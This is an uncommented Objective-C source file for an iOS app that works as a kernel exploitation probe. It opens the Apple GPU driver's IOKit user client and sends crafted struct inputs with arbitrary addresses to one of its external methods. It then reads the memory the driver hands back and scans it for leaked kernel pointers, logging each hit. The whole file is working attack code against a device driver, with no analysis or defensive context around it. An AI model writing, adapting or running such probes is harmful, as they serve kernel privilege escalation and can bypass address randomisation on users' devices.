#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[vm] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void scan(const char*tag,const uint8_t*b,size_t n){int hits=0;for(size_t i=0;i+8<=n;i+=8){uint64_t q=rd64(b+i);if((q&0xfffffff000000000ULL)==0xfffffff000000000ULL||(q>=0xffffffe000000000ULL&&q<0xffffffff00000000ULL)){L(@"[HIT %s] +0x%zx = 0x%llx",tag,i,(unsigned long long)q);if(++hits>8)break;}}}
static void one(io_connect_t c,const char*tag,uint64_t addr,uint64_t len){
 uint8_t in[0x100]; memset(in,0,sizeof(in));
 *(uint32_t*)(in+0x00)=0x40; *(uint64_t*)(in+0x18)=0;
 *(uint64_t*)(in+0x38)=addr; *(uint64_t*)(in+0x40)=len; *(uint64_t*)(in+0x48)=0; *(uint32_t*)(in+0x50)=0x4000;
 uint8_t out[0x1000]; memset(out,0xAA,sizeof(out)); size_t os=sizeof(out);
 kern_return_t kr=IOConnectCallStructMethod(c,8,in,0x100,out,&os);
 L(@"[%s] addr=0x%llx -> 0x%x osz=0x%zx q0=0x%llx q1=0x%llx q3=0x%llx q10=0x%llx",tag,(unsigned long long)addr,kr,os,
   (unsigned long long)rd64(out),(unsigned long long)rd64(out+8),(unsigned long long)rd64(out+0x18),(unsigned long long)rd64(out+0x50));
 if(kr) return;
 uint64_t q3=rd64(out+0x18);
 vm_address_t a=(vm_address_t)q3; vm_size_t sz=0; vm_region_basic_info_data_64_t bi; mach_port_t obj=0; mach_msg_type_number_t cnt=VM_REGION_BASIC_INFO_COUNT_64;
 kern_return_t mr=vm_region_64(mach_task_self(),&a,&sz,VM_REGION_BASIC_INFO_64,(vm_region_info_t)&bi,&cnt,&obj);
 L(@"[%s] map q3=0x%llx region=0x%x addr=0x%llx size=0x%llx prot=%d max=%d",tag,(unsigned long long)q3,mr,(unsigned long long)a,(unsigned long long)sz,bi.protection,bi.max_protection);
 if(obj) mach_port_deallocate(mach_task_self(),obj);
 if(mr==0 && q3>0x10000 && sz>=0x1000){
   volatile uint64_t *p=(volatile uint64_t*)(uintptr_t)q3;
   int nz=0; for(int i=0;i<0x800;i+=8){uint64_t q=p[i/8];if(q){if(nz<24)L(@"[%s] q3+0x%x = 0x%llx",tag,i,(unsigned long long)q);nz++;}}
   L(@"[%s] q3 nonzero qwords=%d",tag,nz);
   scan(tag,(const uint8_t*)(uintptr_t)q3,0x1000);
 }
}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AGXAcceleratorG14P"));
 L(@"[svc] 0x%x",svc); if(!svc)return;
 io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&c); IOObjectRelease(svc);
 L(@"[open] 0x%x",kr); if(kr)return;
 vm_address_t buf=0; vm_size_t bsz=0x4000;
 vm_allocate(mach_task_self(),&buf,bsz,VM_FLAGS_ANYWHERE);
 uint64_t *bp=(uint64_t*)buf; for(int i=0;i<0x800;i++) bp[i]=0x1122334400000000ULL|i;
 mlock((void*)buf,bsz);
 L(@"[buf] va=0x%llx",(unsigned long long)buf);
 one(c,"own",buf,0x4000);
 uint64_t addrs[]={0x04D00000ULL,0x04D04000ULL,0x04D08000ULL,0x04D0C000ULL,0x04D10000ULL,0x04D14000ULL,0x04D18000ULL,0x04D1C000ULL,0x800000000ULL,0x100000000ULL,0x1000ULL,0};
 for(int i=0;i<12;i++) one(c,"scan",addrs[i],0x4000);
 IOServiceClose(c); L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"VMTest\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"vm.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
